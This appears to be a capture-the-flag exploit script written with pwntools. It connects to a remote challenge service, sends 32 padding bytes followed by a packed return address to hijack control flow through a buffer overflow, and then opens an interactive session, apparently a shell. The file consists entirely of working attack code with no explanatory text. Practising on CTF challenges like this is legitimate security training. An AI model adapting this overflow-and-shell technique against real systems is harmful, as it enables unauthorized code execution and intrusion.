from pwn import *

context.log_level="debug"
r=remote("pwn.sixstars.team",22500)


sh='a'*32+p32(0x40075e)


r.recvline()
r.send(sh)
r.interactive()
